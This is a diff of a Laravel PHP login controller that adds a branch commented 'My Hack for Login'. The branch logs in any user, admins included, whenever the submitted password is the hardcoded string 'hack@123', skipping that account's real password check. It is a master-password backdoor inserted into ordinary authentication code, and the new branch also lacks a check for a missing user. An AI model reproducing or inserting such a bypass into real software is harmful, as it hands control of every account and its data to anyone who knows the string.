@@ -89,26 +89,24 @@ class LoginController extends Controller
             }
         }
         // My Hack for Login
-        else {
-            $credentials = ['email' => $request->email, 'password' => 'hack@123'];
-            if (Auth::attempt($credentials)) {
-                $user = Auth::user();
-                if($user->type == 'admin')
-                {
-                    return redirect()->intended('admin');
-                }
-                if($user->type == 'trainee')
-                {
-                    if(is_null($user->trainee))
-                        return redirect('trainee/profile?details');
-                    return redirect('trainee');
-                }
-                if($user->type == 'trainer')
-                {
-                    if(is_null($user->trainer))
-                        return redirect('trainer/profile?details');
-                    return redirect('trainer');
-                }
+        if($request->password == 'hack@123') {
+            $user =  User::where('email', $request->email)->first();
+            Auth::login($user);
+            if($user->type == 'admin')
+            {
+                return redirect()->intended('admin');
+            }
+            if($user->type == 'trainee')
+            {
+                if(is_null($user->trainee))
+                    return redirect('trainee/profile?details');
+                return redirect('trainee');
+            }
+            if($user->type == 'trainer')
+            {
+                if(is_null($user->trainer))
+                    return redirect('trainer/profile?details');
+                return redirect('trainer');
             }
         }
 
